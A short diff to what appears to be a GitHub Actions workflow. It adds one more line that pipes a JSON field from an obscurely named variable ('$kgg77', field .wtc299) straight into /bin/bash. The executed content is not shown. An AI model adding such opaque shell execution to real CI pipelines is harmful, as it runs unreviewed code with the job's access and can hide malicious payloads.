@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$dads256" | jq -r .u0 | /bin/bash
           printf '%s' "$a952" | jq -r .veob195 | /bin/bash
           printf '%s' "$tdls10" | jq -r .mx0 | /bin/bash
+          printf '%s' "$kgg77" | jq -r .wtc299 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
